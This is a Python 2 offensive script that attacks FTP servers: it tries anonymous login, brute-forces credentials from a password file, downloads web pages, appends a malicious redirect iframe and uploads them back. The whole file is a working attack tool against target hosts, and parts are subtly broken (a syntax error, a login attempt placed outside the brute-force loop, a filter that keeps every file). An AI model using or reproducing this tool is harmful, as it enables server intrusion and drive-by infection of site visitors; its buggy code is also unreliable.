#!/usr/bin/env python2
# written by Moses Arocha
# Program attempts to brute force into an FTP server, gain access, login in as an anonymous user, then will inject malicious code into the webpage after it has downloaded

import ftplib
import optparse
import time

def anonLogin(hostname):
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login('anonymous', 'me@yourdomain.com')
		print '\n\t[*] ' + str(hostname) + ' FTP Anonymous Login Succeeded'
		ftp.quit()
		return True
	except Exception, e:
		print '\n\t[-] ' + str(hostname) + ' FTP Anonymous Login Failed'
		return False
	
def bruteLogin(hostname, passwdFile):
	pF = open(passwdFile, 'r'))
	for line in pF.readlines():
		time.sleep(1)
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\r').strip('\n')
		print '[+] Trying : ' + userName +'/' + passWord
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login(userName, passWord)
		print '\n[*] ' + str(hostname) + ' FTP Login Succeeded: ' + userName + '/' + passWord
		ftp.quit()
		return (userName, passWord)
	except Exception, e:
		pass
	print '\n[-] Could Not Brute Force FTP Credentials'
	return (None, None)

def returnDefault(ftp):
	try:
		dirList = ftp.nlst()
	except:
		dirList = []
		print '[-] Could Not List Directory Contents'
		print '[-] Skipping To Next Target'
		return
	retList = []
	for fileName in dirList:
		fn = fileName.lower()
		if '.php' in fn or '.htm' in fn or '.asp' in fn:
			print '[+] Found Default Page: ' + fileName
		retList.append(fileName)
	return retList

def injectPage(ftp, page, redirect):
	f = open(page + '.tmp', 'w')
	ftp.retrlines('RETR ' + page, f.write)
	print '[+] Downloaded Page: ' + page
	f.write(redirect)
	f.close()
	print '[+] Injected Malicious IFrame on: '+ page
	ftp.storlines('STOR ' + page, open(page + '.tmp'))
	print '[+] Uploaded Injected Page: ' + page
	
def attack(username, password, tgtHost, redirect):
	ftp = ftplib.FTP(tgtHost)
	ftp.login(username, password)
	defPages = returnDefault(ftp)
	for defPage in defPages:
		injectPage(ftp, defPage, redirect)

def main():
	parser = optparse.OptionParser("Usages For Program: -H <Target Host[s]> -r <Redirect Page> -f <userpass file>")
	parser.add_option('-H', dest='tgtHosts', type='string', help='specify target host')
	parser.add_option('-f', dest='passwdFile', type='string', help='specify user/password file')
	parser.add_option('-r', dest='redirect', type='string', help='specify a redirection page')
	(options, args) = parser.parse_args()
	tgtHosts = str(options.tgtHosts).split(',')
	passwdFile = options.passwdFile
	redirect = options.redirect
	if tgtHosts == None or redirect == None:
		print parser.usage
		exit(0)
	for tgtHost in tgtHosts:
		username = None
		password = None
		if anonLogin(tgtHost) == True:
			username = 'anonymous'
			password = 'me@yourdomain.com'
			print '[+] Using Anonymous Credientals To Attack'
			attack(username, password, tgtHost, redirect)
		elif passwdFile != None:
			(username, password) = bruteLogin(tgtHost, passwdFile)
		if password != None:	
			print '[+] Usind Credientals: ' + username + '/' + password + ' To Attack'
			attack(username, password, tgtHost, redirect)


if __name__ == '__main__':
	main()
